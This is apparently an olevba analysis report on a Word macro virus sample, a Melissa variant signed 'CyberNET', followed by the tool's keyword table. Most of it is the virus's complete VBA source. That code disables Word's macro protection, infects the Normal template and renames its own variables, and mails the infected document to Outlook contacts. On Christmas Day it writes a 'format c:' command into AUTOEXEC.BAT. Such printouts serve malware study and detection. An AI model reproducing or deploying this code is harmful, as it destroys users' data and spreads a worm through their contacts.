olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.w-792a83b695f27125e270c9a97c693e80e9c8c416
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.w-792a83b695f27125e270c9a97c693e80e9c8c416 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call RQ1093
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For JC998 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next JC998: End If
DH6848 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
KH3668 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set VS2837 = ActiveDocument.VBProject.VBComponents
Call ND4235(VS2837)
GP9524 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set VS2837 = NormalTemplate.VBProject.VBComponents
Call ND4235(VS2837)
II3889 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "DD6243": r1(2) = "AD2680": r1(3) = "HD6295": r1(4) = "IP472": r1(5) = "FV920": r1(6) = "DH6848": r1(7) = "KH3668": r1(8) = "GP9524": r1(9) = "VS2837": r1(10) = "II3889"
r1(11) = "PG7118": r1(12) = "FO7950": r1(13) = "SJ247": r1(14) = "ES7585": r1(15) = "MG6156": r1(16) = "RQ1093": r1(17) = "KR3923": r1(18) = "FJ4443": r1(19) = "UA2821": r1(20) = "TH6424"
r1(21) = "RB7267": r1(22) = "OE3395": r1(23) = "QF1776": r1(24) = "ND4235": r1(25) = "VQ604": r1(26) = "LK5896": r1(27) = "JC998": r1(28) = "HB7347": r1(29) = "LN8585"
For MG6156 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call FV920(a1, r1(MG6156))
Next MG6156
ActiveDocument.Saved = True
End If
If II3889 <> True And GP9524 <> True Then GoTo PG7118
If II3889 = True Then VS2837.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DH6848 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If GP9524 = True Then VS2837.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KH3668 - 8))
PG7118:
If KH3668 <> 0 And DH6848 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function FV920(ES7585, SJ247 As String)
On Error Resume Next
Dim DD6243 As Long: Dim AD2680 As Long: Dim HD6295 As Long: Dim IP472 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DD6243 = 1: AD2680 = 1: HD6295 = .CountOfLines: IP472 = Len(.Lines(.CountOfLines, 1))
Do While .Find(SJ247, DD6243, AD2680, HD6295, IP472, True)
strline = .Lines(DD6243, 1)
strline = Left(strline, AD2680 - 1) & ES7585 & Mid(strline, IP472)
.ReplaceLine DD6243, strline
DD6243 = HD6295 + 1: AD2680 = 1
HD6295 = .CountOfLines
IP472 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function RQ1093()
On Error Resume Next
Dim UA2821, TH6424, RB7267
Set UA2821 = CreateObject("Outlook.Application")
Set TH6424 = UA2821.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If UA2821 = "Outlook" Then
TH6424.Logon "profile", "password"
For KR3923 = 1 To TH6424.AddressLists.Count
Set LN8585 = TH6424.AddressLists(KR3923)
LK5896 = 1
Set RB7267 = UA2821.CreateItem(0)
For FJ4443 = 1 To LN8585.AddressEntries.Count
HB7347 = LN8585.AddressEntries(LK5896)
RB7267.Recipients.Add HB7347
LK5896 = _
LK5896 + 1
If LK5896 > 50 Then FJ4443 = LN8585.AddressEntries.Count
Next FJ4443
RB7267.Subject = "Message From " & Application.UserName
RB7267.Body = "This document is very Important and you've GOT to read this !!!"
RB7267.Attachments.Add ActiveDocument.FullName
RB7267.Send
HB7347 = ""
Next KR3923
TH6424.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function ND4235(VS2837)
Dim VQ604 As Object
For Each VQ604 In VS2837
VQ604.CodeModule.DeleteLines 1, _
VQ604.CodeModule.CountOfLines
Next VQ604
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function
































Sub ViewVBCode()
CommandBars("Tools").Controls("Macro").Enabled = False
End Sub
Sub ToolsMacro()
ViewVBCode
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

